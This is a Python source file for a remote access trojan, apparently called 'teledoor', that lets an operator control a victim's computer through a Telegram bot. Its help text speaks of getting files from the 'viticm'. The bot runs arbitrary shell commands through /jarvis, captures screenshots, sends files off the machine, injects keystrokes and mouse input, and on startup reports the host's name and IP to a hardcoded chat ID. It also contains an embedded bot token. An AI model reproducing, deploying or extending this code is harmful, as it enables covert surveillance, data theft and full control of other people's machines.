from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from telegram import Update
import telegram.ext
import subprocess
import pyautogui
import datetime
import platform
import random
import socket
import os


# ROOT_DIR = "/"
# os.chdir(ROOT_DIR)

try:
    with open('token.txt', 'r') as f:
        TOKEN = f.read()
except Exception as E:
    TOKEN = "6845961407:AAGbKJc7LSpkokCVw-jJg9ByyaLoO3oBT_Q"  # @hack505Mark1bot
    print(E)


def cd(update, context):
    try:
        to_change_dir = update.message.text[len('/cd '):]
        os.chdir(to_change_dir)
        update.message.reply_text(f"Command executed successfully:")
    except Exception as E:
        update.message.reply_text(E)


def ls(update, context):
    try:
        list_dir = update.message.text[len("/ls "):]
        os.listdir(list_dir)
        update.message.reply_text(f"Command executed successfully:")
    except Exception as E:
        update.message.reply_text(E)


def system_info(context):
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        info_string = (
            f"System Information:\n\n"
            f"Hostname: {hostname}\n"
            f"IP Address: {ip}\n"
            f"Processor: {plat}\n"
            f"System: {system}\n"
            f"Machine: {machine}")

        try:
            update.message.reply_text(info_string)
            sys_info_send = True
        except:
            pass

        # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
            context.bot.send_message(
                chat_id="5118057698", text=info_string)
    except Exception as e:
        # update.message.reply_text(f"Error: {e}")
        print(e)


def yo(update, context):
    greetings = [
        "Hello!",
        "Hi there!",
        "Greetings!",
        "Hey!",
        "Welcome!",
        "Good day!",
        "Nice to see you!"
        "How it's going!"
        "what on your mind now!"
        "say Ram Ram"
        "say jai shree Ram"
        "did you done it today?"
        "What do you think"
        "Drink some water now!"
        "What is time now?"
        "you are doing great!"
        "what is sin 0^2 * cos 0^2"
    ]

    update.message.reply_text(f"{random.choice(greetings)}")
    # print(greetings)


def take_screenshot():
    # Naming file as time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    # Take a screenshot and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{current_time}.png")
    return f"{current_time}.png"


def start(update, context):
    update.message.reply_text(
        "Hello! Welcoming you to Hack505 offical's . It's Mark I")


def help(update, context):
    update.message.reply_text(""""How can I help you!
                              
    /start    --> just a start
    /yo       --> Greet's you
    /screen   --> Get you the screeshot
    /content  --> chat_idIt all about the content
    /jarvis   --> Extecute any command you want!
    /download --> Get any file form viticm
    /press    --> Press's special keys
    /arrow    --> use the arrows key now!
    /cd       --> let's change the dir
    /ls       --> It list the file name
    $mouse    --> Get the mouse cooradanates
    $type     --> Type anything you want!
                              """)


def content(update, context):
    update.message.reply_text(
        "this project is owned by hack505. check out there github page- www.github.com/hack505")


def screenshot(update, context):
    try:
        image_path = take_screenshot()
        update.message.reply_photo(photo=open(image_path, 'rb'))
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def admin(update, context):
    update.message.reply_text(
        "this bot is a part of teledoor project made by hack505 offical ")


def handle_text(update, context):
    try:
        user_text = update.message.text

        if user_text == "$mouse":
            update.message.reply_text(str(pyautogui.position()))

        # Check if the message starts with the /type command
        elif user_text.startswith('$type'):
            # Extract the text after the /type command
            text_to_type = user_text[len('$type'):].strip()
            if text_to_type:
                pyautogui.write(text_to_type)
            else:
                update.message.reply_text(
                    "Please provide text after the /type command.")

    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def run_command(update, context):
    # Get the command from the user's message
    command = update.message.text[len('/jarvis '):]

    try:
        # Execute the command using subprocess
        result = subprocess.check_output(command, shell=True, text=True)
        update.message.reply_text(f"Command executed successfully:\n{result}")
    except subprocess.CalledProcessError as e:
        update.message.reply_text(f"Error executing command:\n{e}")


def download_file(update, context):
    # Get the file ID from the message
    file_id = update.message.document.file_id

    # Get information about the file
    file_info = context.bot.get_file(file_id)

    # Download the file
    file_path = file_info.download()

    update.message.reply_text(
        f"File downloaded successfully. Path: {file_path}")


def press_key(update, context):
    print("Press key to continue")
    try:
        # Extract the keyour_context_variabley combination after the /presskey command
        key_combination = update.message.text[len('/press '):]
        if key_combination:
            key_combination = key_combination.split()
            print(key_combination)
            pyautogui.hotkey(*key_combination)
        else:
            update.message.reply_text(
                "Please provide a key combination after the /press command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def arrow_key(update, context):
    try:
        # Extract the arrow key command
        arrow_command = update.message.text[len('/arrow '):]

        # Map arrow commands to corresponding keys
        arrow_keys = {
            'up': 'up',
            'down': 'down',
            'left': 'left',
            'right': 'right',
        }

        # Check if the arrow command is valid
        if arrow_command in arrow_keys:
            pyautogui.hotkey(arrow_keys[arrow_command])
        else:
            update.message.reply_text("Invalid arrow key command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def download_requested_file(update: Update, context: CallbackContext) -> None:
    upload_folder = os.getcwd()
    try:
        # Extract the file name from the command
        file_name = update.message.text[len('/download '):].strip()

        # Check if the requested file exists
        file_path = os.path.join(upload_folder, file_name)
        if os.path.exists(file_path):
            # Send the requested file to the user who sent the command
            update.message.reply_document(document=open(file_path, 'rb'))
        else:
            update.message.reply_text(f"File '{file_name}' not found.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


updater = telegram.ext.Updater(TOKEN, use_context=True)


def edit_message(update, context):
    try:
        print("i have reached here to edit")
        new_message_text = "This message has been edited."
        chat_id = update.message.chat_id

        # Send a new message
        sent_message = context.bot.send_message(
            chat_id=chat_id, text=new_message_text)

        # Edit the new message
        context.bot.edit_message_text(
            chat_id=chat_id, message_id=sent_message.message_id, text="Okay")

        update.message.reply_text("Message edited successfully!")

    except Exception as e:
        update.message.reply_text(f"Error: {e}")


updater = telegram.ext.Updater(TOKEN, use_context=True)

disp = updater.dispatcher

disp.add_handler(telegram.ext.CommandHandler('start', start))
disp.add_handler(telegram.ext.CommandHandler("help", help))
disp.add_handler(telegram.ext.CommandHandler("content", content))
# Add the new command handler
disp.add_handler(telegram.ext.CommandHandler("screen", screenshot))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.text, handle_text))
disp.add_handler(telegram.ext.CommandHandler('jarvis', run_command))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.document, download_file))
disp.add_handler(telegram.ext.CommandHandler('yo', yo))
# disp.add_handler(telegram.ext.CommandHandler('yo', yo))
disp.add_handler(telegram.ext.CommandHandler('press', press_key))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.regex("arrow"), arrow_key))
# disp.add_handler(telegram.ext.CommandHandler("sys", system_info_on_request))
disp.add_handler(CommandHandler("download", download_requested_file))
disp.add_handler(CommandHandler("cd", cd))
disp.add_handler(CommandHandler("ls", ls))

# updater.job_queue.run_once(system_info, 0, context=updater)
# updater.job_queue.run_once(lambda context: system_info(None, context), 0)
updater.job_queue.run_once(system_info, 0)

updater.start_polling()
updater.idle()
